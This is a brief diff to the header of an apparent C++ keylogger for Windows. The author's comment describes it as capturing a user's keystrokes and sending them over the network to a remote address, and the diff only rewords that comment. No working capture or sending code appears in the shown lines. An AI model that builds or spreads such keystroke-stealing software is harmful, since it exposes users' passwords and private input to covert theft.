@@ -1,7 +1,7 @@
 // Jose E. Rodriguez (aka vectorNull)
 // June 9, 2021
 // jose@vectornullsec.com
-// This is my first attempt at a keylogger program in C++. This is meant to run on Windows. Collects the user's keystrokes and sends them back via a network to an address of choice. 
+// This is my first attempt at a keylogger program in C++. This is meant to run on Windows. Collects the user's keystrokes and sends them back via a network to a source address.
 
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #pragma comment(lib, "Ws2_32.lib")
